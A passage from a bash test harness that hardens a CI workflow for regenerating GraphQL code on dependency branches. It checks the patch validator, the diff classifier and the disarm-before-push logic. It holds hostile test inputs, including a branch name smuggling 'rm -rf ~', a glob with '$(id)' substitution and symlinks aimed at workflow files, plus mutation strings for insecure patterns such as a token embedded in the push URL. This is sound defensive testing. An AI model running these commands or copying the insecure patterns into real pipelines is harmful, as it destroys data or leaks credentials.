    R="$CGW/v-delete"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    rm "$R/$CG_G"; cg_snap "$R"
    cgv "$R" reject "a delete" "it creates, deletes, renames, copies or re-modes a file"
    R="$CGW/v-rename"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    git -C "$R" mv "$CG_REQ" "$CG_GEN/renamed.req.gql.dart"; mkdir -p "$R.rt/codegen-in"
    git -C "$R" diff --cached --binary -M > "$R.rt/codegen-in/codegen.patch"; git -C "$R" reset -q --hard HEAD
    cgv "$R" reject "a rename" "it creates, deletes, renames, copies or re-modes a file"
    R="$CGW/v-mode"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    chmod +x "$R/$CG_REQ"; cg_snap "$R"
    cgv "$R" reject "a mode change" "it creates, deletes, renames, copies or re-modes a file"
    R="$CGW/v-binary"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    printf '\000\001\002binary' > "$R/$CG_REQ"; cg_snap "$R"
    cgv "$R" reject "a binary hunk" "is a binary change"
    R="$CGW/v-symlink"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    ln -s ../../../../.github/workflows/ci.yml "$R/$CG_GEN/link.req.gql.dart"
    git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
    rm "$R/$CG_GEN/link.req.gql.dart"; ln -s ../../../../apps/mobile/pubspec.lock "$R/$CG_GEN/link.req.gql.dart"; cg_snap "$R"
    cgv "$R" reject "a symlink retarget" "mode '120000'"
    R="$CGW/v-notgen"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    echo x > "$R/$CG_GEN/notes.md"; git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
    echo y >> "$R/$CG_GEN/notes.md"; cg_snap "$R"
    cgv "$R" reject "a non-generated file inside the generated directory" "notes.md is outside the generated-file paths"
    R="$CGW/v-lookalike"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    mkdir -p "$R/apps/mobile/lib/graphql/__generated__x"; printf 'a\n' > "$R/apps/mobile/lib/graphql/__generated__x/foo.gql.dart"
    git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
    cg_blank "$R" "apps/mobile/lib/graphql/__generated__x/foo.gql.dart"; cg_snap "$R"
    cgv "$R" reject "a look-alike directory" "__generated__x/foo.gql.dart is outside the generated-file paths"
    R="$CGW/v-oddpath"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    printf 'a\n' > "$R/$CG_GEN/we ird.gql.dart"; git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
    cg_blank "$R" "$CG_GEN/we ird.gql.dart"; cg_snap "$R"
    cgv "$R" reject "a path with a space" "unusual path"
    R="$CGW/v-branch"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    cg_blank "$R" "$CG_REQ"; cg_snap "$R"
    cgv "$R" reject "branch main" "head branch 'main' is not a deps-cadence branch" main
    cgv "$R" reject "a branch with shell metacharacters" "is not a deps-cadence branch" 'chore/deps-2026-11;rm -rf ~'
    cgv "$R" reject "month 13" "is not a deps-cadence branch" chore/deps-2026-13
    R="$CGW/v-loop"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    cg_blank "$R" "$CG_REQ"; git -C "$R" add -A && git -C "$R" commit -qm "$SUBJ"
    cg_blank "$R" "$CG_G"; cg_snap "$R"
    cgv "$R" reject "the LOOP BREAKER (a second codegen commit)" "refusing to push again"
    R="$CGW/v-empty"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    mkdir -p "$R.rt/codegen-in"; : > "$R.rt/codegen-in/codegen.patch"
    cgv "$R" reject "an empty artifact" "the artifact holds no patch"
    # The deny list holds when the globs are widened, and the globs themselves are checked.
    R="$CGW/v-widen"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    echo "  evil: 1.0.0" >> "$R/apps/mobile/pubspec.lock"; echo "dependencies: {evil: any}" >> "$R/apps/mobile/pubspec.yaml"; cg_snap "$R"
    cgv "$R" reject "a lockfile under a widened glob" "is a workflow, manifest or lockfile" chore/deps-2026-11 "apps/mobile/*.lock apps/mobile/*.yaml"
    cgv "$R" reject "a hostile glob" "is not a plain path glob" chore/deps-2026-11 'apps/$(id)/*.dart'
    cgv "$R" reject "an empty glob list" "CODEGEN_GLOBS is empty" chore/deps-2026-11 ""

    # ── glob-to-re ──
    cg_glob 'a/*.dart' a/x.dart y
    cg_glob 'a/*.dart' a/b/x.dart n
    cg_glob 'a/*.dart' a/xdart n
    cg_glob 'a/x.dart' a/xXdart n
    cg_glob 'a/**/*.dart' a/x.dart y
    cg_glob 'a/**/*.dart' a/b/c/x.dart y
    cg_glob 'a/**/*.dart' b/a/x.dart n
    cg_glob 'a/?.dart' a/b.dart y
    cg_glob 'a/?.dart' a/bb.dart n
    cg_glob 'a/c++.dart' a/c++.dart y
    cg_glob 'a/c++.dart' a/c.dart n
    cg_glob 'a/@x/y.dart' a/@x/y.dart y
    cg_glob 'a/*.dart' 'a/x.dart.evil' n

    # ── classify-codegen-diff ──
    R="$CGW/c-blank"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
    printf '// GENERATED\n\nimport "a.dart";\n' > "$R/$CG_REQ"; git -C "$R" add -A && git -C "$R" commit -qm "seed an empty line to remove"
    cg_blank "$R" "$CG_G"; cg_blank "$R" "$CG_MOCKS"; printf '// GENERATED\nimport "a.dart";\n' > "$R/$CG_REQ"; git -C "$R" add -A
    cg_classify "$R" || cg_fail "empty-lines-only: classify exited non-zero"
    [ "$CLS_OUT" = false ] || cg_fail "adding and removing EMPTY lines was classified '$CLS_OUT', wanted false (auto-merge stays armed)"
    [ ! -e "$R.rt/codegen-review.md" ] || cg_fail "a review body was written for an empty-lines-only change"

    R="$CGW/c-strws"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"
    sed -i.bak 's/query Weather { forecast/query Weather {  forecast/' "$R/$CG_REQ" && rm -f "$R/$CG_REQ.bak"; git -C "$R" add -A
    cg_sub "whitespace inside a string literal (the -w bypass)" "$R"
    [ -z "$(git -C "$R" diff --cached -w --ignore-blank-lines)" ] || cg_fail "the -w bypass fixture is not a bypass (git -w sees a change), so the case proves nothing"
    R="$CGW/c-spaces"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"; printf '    \n' >> "$R/$CG_REQ"; git -C "$R" add -A
    cg_sub "a spaces-only line" "$R"
    R="$CGW/c-tab"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"; printf '\t\n' >> "$R/$CG_REQ"; git -C "$R" add -A
    cg_sub "a tab-only line" "$R"
    R="$CGW/c-reorder"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"
    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\nconst url = "https://api.example.com/graphql";\nfinal b = 2;\nfinal a = 1;\n' > "$R/$CG_REQ"; git -C "$R" add -A
    cg_sub "reordered lines" "$R"
    R="$CGW/c-crlf"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"
    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\r\nconst url = "https://api.example.com/graphql";\nfinal a = 1;\nfinal b = 2;\n' > "$R/$CG_REQ"; git -C "$R" add -A
    git -C "$R" diff --cached --quiet && cg_fail "the CRLF fixture staged nothing"
    cg_sub "CRLF on one line" "$R"
    R="$CGW/c-lonecr"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
    printf '// GENERATED\n\nimport "a.dart";\n' > "$R/$CG_REQ"; git -C "$R" add -A && git -C "$R" commit -qm "seed an empty line"
    printf '// GENERATED\n\r\nimport "a.dart";\n' > "$R/$CG_REQ"; git -C "$R" add -A
    git -C "$R" diff --cached --quiet && cg_fail "the lone-CR fixture staged nothing"
    cg_sub "an empty line that becomes a lone CR" "$R"
    R="$CGW/c-nonl"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"
    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\nconst url = "https://api.example.com/graphql";\nfinal a = 1;\nfinal b = 2;\n\n' > "$R/$CG_REQ"
    git -C "$R" add -A && git -C "$R" commit -qm "seed trailing empty line"
    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\nconst url = "https://api.example.com/graphql";\nfinal a = 1;\nfinal b = 2;' > "$R/$CG_REQ"; git -C "$R" add -A
    cg_sub "a missing trailing newline (\\ No newline)" "$R"
    R="$CGW/c-mode"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
    cg_blank "$R" "$CG_REQ"; chmod +x "$R/$CG_G"; git -C "$R" add -A
    cg_sub "a mode change beside empty lines" "$R"
    R="$CGW/c-emptydiff"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
    cg_sub "an empty diff" "$R"
    # Canned diff text through a git stub: the verdict comes from the parse.
    local gs="$CGW/gitstub" realgit body
    realgit="$(command -v git)"; mkdir -p "$gs"
    cat > "$gs/git" <<STUBEOF
#!/usr/bin/env bash
for a in "\$@"; do
  if [ "\$a" = "--unified=0" ]; then cat "\$CANNED_DIFF"; exit 0; fi
done
exec "$realgit" "\$@"
STUBEOF
    chmod +x "$gs/git"
    cg_canned() { # <name> <diff text>
        R="$CGW/c-canned-$1"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
        cg_blank "$R" "$CG_REQ"; git -C "$R" add -A
        printf '%b' "$2" > "$CGW/canned-$1.diff"
        cg_classify "$R" PATH="$gs:$PATH" CANNED_DIFF="$CGW/canned-$1.diff" || cg_fail "canned $1: classify exited non-zero"
        [ "$CLS_OUT" = true ] || cg_fail "canned $1: classified '$CLS_OUT', wanted substantive=true"
    }
    cg_canned garbage 'this is not a diff\n+\n'
    cg_canned plus-without-hunk 'diff --git a/x b/x\nindex 1..2 100644\n--- a/x\n+++ b/x\n+\n'
    cg_canned hunk-without-file '@@ -1,0 +2 @@\n+\n'
    cg_canned context-line 'diff --git a/x b/x\nindex 1..2 100644\n--- a/x\n+++ b/x\n@@ -1,0 +2 @@\n \n+\n'
    cg_canned binary 'diff --git a/x b/x\nindex 1..2 100644\nBinary files a/x and b/x differ\n'
    cg_canned empty ''
    cg_canned headers-only 'diff --git a/x b/x\nindex 1111111..2222222 100644\n--- a/x\n+++ b/x\n'
    cg_canned hunk-without-changes 'diff --git a/x b/x\nindex 1111111..2222222 100644\n--- a/x\n+++ b/x\n@@ -1,0 +1,0 @@\n'
    cg_canned mode-header 'diff --git a/x b/x\nold mode 100644\nnew mode 100755\n@@ -1,0 +2 @@\n+\n'
    cg_canned no-newline-marker 'diff --git a/x b/x\nindex 1111111..2222222 100644\n--- a/x\n+++ b/x\n@@ -1,0 +2 @@\n+\n\\\\ No newline at end of file\n'
    R="$CGW/c-canned-ok"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"; cg_blank "$R" "$CG_REQ"; git -C "$R" add -A
    printf 'diff --git a/x b/x\nindex 1111111..2222222 100644\n--- a/x\n+++ b/x\n@@ -1,0 +2 @@\n+\n@@ -5 +5,0 @@\n-\n' > "$CGW/canned-ok.diff"
    cg_classify "$R" PATH="$gs:$PATH" CANNED_DIFF="$CGW/canned-ok.diff" || cg_fail "canned valid: classify exited non-zero"
    [ "$CLS_OUT" = false ] || cg_fail "the stub with a VALID empty-lines diff classified '$CLS_OUT', so the canned rejections prove nothing"
    # An error is substantive.
    R="$CGW/c-err"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"; cg_blank "$R" "$CG_REQ"; git -C "$R" add -A
    cg_classify "$R" GIT_DIR="$CGW/does-not-exist" || cg_fail "an error: classify exited non-zero (it must always exit 0)"
    [ "$CLS_OUT" = true ] || cg_fail "a classification ERROR was '$CLS_OUT', wanted substantive=true (fail closed)"
    grep -qF "classification failed" "$CGW/out" || cg_fail "the error reason is not named"
    # The review body of a substantive change.
    R="$CGW/c-body"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
    printf 'const injected = 1;\n' >> "$R/$CG_REQ"; cg_blank "$R" "$CG_MOCKS"
    git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): an earlier generated edit" -q
    printf 'const injected = 2;\n' >> "$R/$CG_REQ"; git -C "$R" add -A
    cg_sub "new generated code" "$R"
    body="$(cat "$R.rt/codegen-review.md" 2>/dev/null)"
    for name in "needs a human review" 'auto-merge has been **disabled**' "$CG_REQ" 'gh pr merge --auto 2401' '```diff'; do
        grep -qF -- "$name" <<<"$body" || cg_fail "the review body lacks: $name"
    done
    grep -qF -- "$CG_MOCKS" <<<"$body" && cg_fail "the review body lists a file that is not staged"
    R="$CGW/c-body2"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
    printf 'const injected = 1;\n' >> "$R/$CG_REQ"; git -C "$R" add -A
    cg_sub "new generated code over a moved lockfile" "$R"
    body="$(cat "$R.rt/codegen-review.md" 2>/dev/null)"
    for name in '-    version: "4.11.1"' '+    version: "4.12.0"'; do
        grep -qF -- "$name" <<<"$body" || cg_fail "the review body does not show the lockfile change: $name"
    done

    # ── push-codegen ──
    cg_stub
    cg_push_repo push-ws false true; cg_run_push false || cg_fail "not substantive: the push step failed: $(tail -n1 "$CGW/out")"
    [ "$(cg_remote_head)" = "$(git -C "$PR_R" rev-parse HEAD)" ] || cg_fail "not substantive: the remote branch did not advance"
    [ "$(git -C "$PR_R" log -1 --format='%an <%ae>')" = "$CG_BOT <4242+$CG_BOT@users.noreply.github.com>" ] \
        || cg_fail "the commit is not authored by the App bot"
    [ "$(git -C "$PR_R" log -1 --format=%s)" = "$SUBJ" ] || cg_fail "the commit subject is not the codegen subject"
    ! cg_called 'pr merge' || cg_fail "not substantive: auto-merge was disabled anyway"
    ! cg_called 'pr comment' || cg_fail "not substantive: a review comment was posted anyway"
    [ "$(cat "$GHS/armed")" = true ] || cg_fail "not substantive: auto-merge is no longer armed"

    cg_push_repo push-sub false true; printf 'REVIEW BODY\n' > "$PR_R.rt/codegen-review.md"
    cg_run_push true || cg_fail "substantive: the push step failed: $(tail -n1 "$CGW/out")"
    cg_called 'pr merge --disable-auto 2401' || cg_fail "substantive: auto-merge was not disabled"
    [ "$(cat "$GHS/remote_at_disable" 2>/dev/null)" = "$OLD_HEAD" ] || cg_fail "substantive: auto-merge was not disarmed BEFORE the push"
    [ "$(cg_remote_head)" = "$(git -C "$PR_R" rev-parse HEAD)" ] || cg_fail "substantive: the commit was not pushed after disarming"
    grep -qx 'REVIEW BODY' "$GHS/comment" 2>/dev/null || cg_fail "substantive: the classifier's review body was not posted"

    cg_push_repo push-unset false true; cg_run_push UNSET || cg_fail "no classification output: the push step failed"
    cg_called 'pr merge --disable-auto' || cg_fail "a missing classification was not treated as substantive"
    grep -qF 'needs a human review' "$GHS/comment" 2>/dev/null || cg_fail "no fallback review comment for a missing classification"
    cg_push_repo push-garbage false true; cg_run_push maybe || cg_fail "a garbage classification: the push step failed"
    cg_called 'pr merge --disable-auto' || cg_fail "a classification other than an explicit false was not treated as substantive"

    cg_push_repo push-queued true false; cg_run_push true || cg_fail "queued: the push step failed: $(tail -n1 "$CGW/out")"
    cg_called dequeuePullRequest || cg_fail "substantive while queued: the PR was not dequeued"
    [ "$(cg_remote_head)" = "$(git -C "$PR_R" rev-parse HEAD)" ] || cg_fail "substantive while queued: not pushed after dequeuing"

    cg_push_repo push-faildisarm false true; touch "$GHS/fail_disable"
    if cg_run_push true; then cg_fail "a failed disarm did not fail the push step"; fi
    grep -qF "not pushing substantive generated code to an armed PR" "$CGW/out" || cg_fail "a failed disarm does not name the refusal"
    [ "$(cg_remote_head)" = "$OLD_HEAD" ] || cg_fail "a failed disarm still pushed"
    ! cg_called 'pr comment' || cg_fail "a failed disarm still posted a comment"
    return "$cg_rc"
}

echo "deps-cadence codegen:"
[ -r "$CODEGEN" ] || { bad "missing template: $CODEGEN"; exit 1; }
if out="$(cg_static "$CODEGEN" "$IMPL")"; then
    ok "the codegen template holds every static rule (trigger and gates, no secret in regen, one late scoped mint, hooks off, token out of argv, fail closed, no -w)"
else
    while IFS= read -r l; do bad "$l"; done <<<"$out"
fi
if out="$(cg_exec "$CODEGEN")"; then
    ok "the extracted blocks hold every executed rule (hostile patches, glob-to-re, the empty-line classifier, disarm-before-push)"
else
    while IFS= read -r l; do bad "$l"; done <<<"$out"
fi

# cgmutate <name> <static|exec|both> <from> <to> — LITERAL replacement in a copy.
cgmutate() {
    local name="$1" kind="$2" mt="$WORK/mut-codegen.yml"
    FROM="$3" TO="$4" perl -0pe 's/\Q$ENV{FROM}\E/$ENV{TO}/g' "$CODEGEN" > "$mt"
    if cmp -s "$mt" "$CODEGEN"; then bad "mutation ($name) changed nothing, so it proves nothing (template reworded?)"; return; fi
    if [ "$kind" != exec ] && cg_static "$mt" "$IMPL" >/dev/null 2>&1; then bad "mutation ($name) PASSED the static check — the gate cannot catch it"; return; fi
    if [ "$kind" = exec ] && cg_exec "$mt" >/dev/null 2>&1; then bad "mutation ($name) PASSED the executed check — the gate cannot catch it"; return; fi
    ok "mutation ($name) fails the check"
}
cgmutate_impl() { # <name> <from> <to> — a mutation of the IMPL seen by the codegen static check
    local mi="$WORK/mut-impl-cg.yml"
    FROM="$2" TO="$3" perl -0pe 's/\Q$ENV{FROM}\E/$ENV{TO}/g' "$IMPL" > "$mi"
    if cmp -s "$mi" "$IMPL"; then bad "mutation ($1) changed nothing, so it proves nothing"; return; fi
    if cg_static "$CODEGEN" "$mi" >/dev/null 2>&1; then bad "mutation ($1) PASSED the check — the gate cannot catch it"; else ok "mutation ($1) fails the check"; fi
}

BOT_AUTHOR="github.event.pull_request.user.login == '$CG_BOT' &&"
cgmutate "pull_request_target trigger" static $'on:\n  pull_request:' $'on:\n  pull_request_target:'
cgmutate "regen drops the author gate" static "    if: >-
      $BOT_AUTHOR
      startsWith(github.event.pull_request.head.ref, 'chore/deps-') &&
      github.event.pull_request.head.repo.full_name == github.repository
    # Ephemeral" "    if: >-
      startsWith(github.event.pull_request.head.ref, 'chore/deps-') &&
      github.event.pull_request.head.repo.full_name == github.repository
    # Ephemeral"
cgmutate "push drops the sender gate" static "      github.event.sender.login == '$CG_BOT' &&"$'\n' ''
cgmutate "push drops the head-repo gate" static $'      startsWith(github.event.pull_request.head.ref, \'chore/deps-\') &&\n      github.event.pull_request.head.repo.full_name == github.repository\n    runs-on: ubuntu-latest\n    timeout-minutes: 10' $'      startsWith(github.event.pull_request.head.ref, \'chore/deps-\')\n    runs-on: ubuntu-latest\n    timeout-minutes: 10'
cgmutate "push runs when regen found nothing" static "      needs.regen.outputs.changed == 'true' &&"$'\n' ''
cgmutate "secret in the regen job" static $'    outputs:\n      changed: ${{ steps.patch.outputs.changed }}' $'    outputs:\n      changed: ${{ steps.patch.outputs.changed }}\n    env:\n      KEY: ${{ secrets.PLATFORM_WRITER_APP_PRIVATE_KEY }}'
CGMINT="$(sed -n '/^      - name: Mint GitHub App token$/,/^          permission-pull-requests: write$/p' "$CODEGEN")"
cgmutate "App token minted in regen" static $'      - name: Regenerate\n' "$CGMINT"$'\n\n      - name: Regenerate\n'
cgmutate "App token minted before validation" static $'      - name: Validate and apply the codegen patch\n' "$CGMINT"$'\n\n      - name: Validate and apply the codegen patch\n'
cgmutate "mint without a repository scope" static $'          repositories: ${{ github.event.repository.name }}\n' ''
cgmutate "mint asks for workflows write" static $'          permission-pull-requests: write\n' $'          permission-pull-requests: write\n          permission-workflows: write\n'
cgmutate "GITHUB_TOKEN fallback" static 'GH_TOKEN: ${{ steps.app_token.outputs.token }}' 'GH_TOKEN: ${{ steps.app_token.outputs.token || secrets.GITHUB_TOKEN }}'
cgmutate "built-in token granted write" static $'permissions:\n  contents: read\n\n# One run' $'permissions:\n  contents: write\n\n# One run'
cgmutate "a package manager in push" static $'      - name: Classify the regenerated diff\n' $'      - name: Install\n        run: npm install\n\n      - name: Classify the regenerated diff\n'
cgmutate "a third-party action in push" static $'      - name: Classify the regenerated diff\n' $'      - uses: octo-org/helper@v1\n\n      - name: Classify the regenerated diff\n'
cgmutate "self-hosted runner" static $'    runs-on: ubuntu-latest\n    timeout-minutes: 30' $'    runs-on: [self-hosted, linux]\n    timeout-minutes: 30'
cgmutate "checkout persists credentials" static $'          fetch-depth: 0\n          persist-credentials: false' $'          fetch-depth: 0'
cgmutate "event value interpolated into a script" static $'          set -euo pipefail\n          bash -euo pipefail -c "$CODEGEN_COMMAND"' $'          set -euo pipefail\n          echo "${{ github.event.pull_request.head.ref }}"\n          bash -euo pipefail -c "$CODEGEN_COMMAND"'
cgmutate "continue-on-error" static $'        id: classify\n' $'        id: classify\n        continue-on-error: true\n'
cgmutate "token in the push URL" static $'git "${nohooks[@]}" -c credential.helper= \\\n            -c \'credential.helper=!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f\' \\\n            push "${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}.git"' 'git "${nohooks[@]}" push "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"'
cgmutate "token expanded into argv" static $'-c \'credential.helper=!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f\'' $'-c "credential.helper=!f() { echo username=x-access-token; echo password=$GH_TOKEN; }; f"'
cgmutate "global git config honoured in push" static $'          export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null\n          nohooks=(-c core.hooksPath=/dev/null -c core.fsmonitor=false)\n          # Fail closed' $'          nohooks=(-c core.hooksPath=/dev/null -c core.fsmonitor=false)\n          # Fail closed'
cgmutate "hooks run on commit" static 'git "${nohooks[@]}" commit' 'git commit'
cgmutate "hooks run on ls-files in the validator" static 'git "${nohooks[@]}" ls-files -s' 'git ls-files -s'
cgmutate "classifier ignores whitespace (-w)" static 'diff --cached --unified=0 --no-color' 'diff --cached -w --unified=0 --no-color'
cgmutate "classifier ignores blank lines" static 'diff --cached --unified=0 --no-color' 'diff --cached --ignore-blank-lines --unified=0 --no-color'
cgmutate "classifier honours GIT_EXTERNAL_DIFF" static 'env -u GIT_EXTERNAL_DIFF -u GIT_DIFF_OPTS LC_ALL=C git "${nohooks[@]}" \'$'\n                -c color.ui=false' 'LC_ALL=C git "${nohooks[@]}" \'$'\n                -c color.ui=false'
cgmutate "classifier defaults to auto-mergeable" static $'          substantive=true\n          reason="classification failed' $'          substantive=false\n          reason="classification failed'
cgmutate "push defaults to auto-mergeable" static $'          substantive=true\n          [ "${SUBSTANTIVE:-}" = "false" ] && substantive=false' $'          substantive=false\n          [ "${SUBSTANTIVE:-}" = "true" ] && substantive=true'
cgmutate "loop breaker removed" static 'refusing to push again' 'pushing again'
cgmutate "globs read with an unquoted expansion" static 'read -r -a globs <<<"$CODEGEN_GLOBS"' 'globs=($CODEGEN_GLOBS)'
cgmutate "deny list removed" static $'denied=\'^\\.git(hub)?/|' $'denied=\'^NEVER/|'
cgmutate "flutter reader drifts from the impl's" static $'if ! [[ "$v" =~ ^[0-9]+\\.[0-9]+\\.[0-9]+$ ]]; then\n            echo "::error::$PIN_FILE does not pin an exact Flutter' $'if ! [[ "$v" =~ ^[0-9]+\\.[0-9]+(\\.[0-9]+)?$ ]]; then\n            echo "::error::$PIN_FILE does not pin an exact Flutter'
cgmutate_impl "the impl's validator calls git ls-files without nohooks" 'git "${nohooks[@]}" ls-files -s' 'git ls-files -s'
cgmutate_impl "the impl's commit loses nohooks" 'git "${nohooks[@]}" commit' 'git commit'
# Executed rules.
cgmutate "branch check removed" exec '[[ "$HEAD_REF" =~ ^chore/deps-[0-9]{4}-(0[1-9]|1[0-2])$ ]] \'$'\n            || reject' 'true \'$'\n            || reject'
cgmutate "loop breaker never fires" exec '[ "$(git "${nohooks[@]}" log -1 --format=%s)" = "$CODEGEN_SUBJECT" ]' '[ "never" = "$CODEGEN_SUBJECT" ]'
cgmutate "allowlist check removed" exec '[[ "$path" =~ $allowed ]] || reject "$path is outside the generated-file paths"' 'true'
cgmutate "deny list check removed" exec 'if [[ "$path" =~ $denied ]]; then reject "$path is a workflow, manifest or lockfile"; fi' 'true'
cgmutate "summary (create/delete/rename/mode) check removed" exec '[ -z "$summary" ] || reject' 'true || reject'
cgmutate "binary check removed" exec '[ "$added" != "-" ] || reject "$path is a binary change; generated files are text"' 'true'
cgmutate "odd-path check removed" exec 'if ! [[ "$path" =~ ^[A-Za-z0-9._/@+-]+$ ]] || [[ "$path" == *..* ]]; then' 'if false; then'
cgmutate "regular-file check removed" exec $'[ "$mode" = "100644" ] || [ "$mode" = "100755" ] \\\n              || reject' $'true \\\n              || reject'
cgmutate "glob dot not escaped" exec '[.+@]*) re+="\\${g:0:1}"; g="${g:1}" ;;' '[+@]*) re+="\\${g:0:1}"; g="${g:1}" ;;'
cgmutate "** does not span directories" exec "'**/'*) re+='(.*/)?'; g=\"\${g#'**/'}\" ;;" "'**/'*) re+='[^/]*/'; g=\"\${g#'**/'}\" ;;"
cgmutate "* spans directories" exec "'*'*)   re+='[^/]*';  g=\"\${g#'*'}\" ;;" "'*'*)   re+='.*';  g=\"\${g#'*'}\" ;;"
cgmutate "globs read with an unquoted expansion (executed)" exec 'read -r -a globs <<<"$CODEGEN_GLOBS"' 'globs=($CODEGEN_GLOBS)'
cgmutate "classifier accepts a spaces-only line" exec '/^@@ -[0-9]+(,[0-9]+)? \+[0-9]+(,[0-9]+)? @@/ && mode != "none" { mode = "hunk"; hunks++; next }'$'\n              mode == "hunk" && ($0 == "+" || $0 == "-") {' '/^@@ -[0-9]+(,[0-9]+)? \+[0-9]+(,[0-9]+)? @@/ && mode != "none" { mode = "hunk"; hunks++; next }'$'\n              mode == "hunk" && ($0 ~ /^[+-][[:space:]]*$/) {'
cgmutate "classifier uses -w" exec 'diff --cached --unified=0 --no-color' 'diff --cached -w --unified=0 --no-color'
cgmutate "classifier ignores context lines" exec 'mode == "hunk" && ($0 == "+" || $0 == "-") { changes++; next }' 'mode == "hunk" && ($0 == "+" || $0 == "-" || $0 ~ /^ /) { changes++; next }'
cgmutate "classifier accepts an empty diff" exec 'if (!bad && hunks > 0 && changes > 0)' 'if (!bad)'
cgmutate "classifier trusts a hunk-less file" exec '/^@@ -[0-9]+(,[0-9]+)? \+[0-9]+(,[0-9]+)? @@/ && mode != "none"' '/^@@ -[0-9]+(,[0-9]+)? \+[0-9]+(,[0-9]+)? @@/'
cgmutate "classifier defaults to auto-mergeable (executed)" exec $'          substantive=true\n          reason="classification failed' $'          substantive=false\n          reason="classification failed'
cgmutate "classifier forgets the error path" exec '--no-textconv --no-renames)"; then' '--no-textconv --no-renames || true)"; then'
cgmutate "disarm skipped" exec 'gh pr merge --disable-auto "$PR_NUMBER" --repo "$GITHUB_REPOSITORY" \' 'true \'
cgmutate "disarm failure ignored" exec 'if [ "$queued" != false ] || [ "$armed" != false ]; then' 'if false; then'
cgmutate "dequeue skipped" exec 'if [ "$queued" = true ]; then' 'if false; then'
cgmutate "push before the disarm" exec $'          # Substantive: disarm BEFORE pushing, so the new code is never on an\n          # armed PR, and push nothing if disarming fails.\n          if [ "$substantive" = true ]; then' $'          git "${nohooks[@]}" -c credential.helper= -c \'credential.helper=!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f\' push "${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}.git" "HEAD:refs/heads/${HEAD_REF}"\n          if [ "$substantive" = true ]; then'
cgmutate "garbage classification stays armed" exec '[ "${SUBSTANTIVE:-}" = "false" ] && substantive=false' '[ "${SUBSTANTIVE:-}" != "true" ] && substantive=false'
cgmutate "no review comment" exec 'gh pr comment "$PR_NUMBER" --repo "$GITHUB_REPOSITORY" --body-file "$body"' 'true'
cgmutate "push commits as nobody" exec 'git config user.name "${APP_SLUG}[bot]"' 'git config user.name "someone"'

exit "$fail"
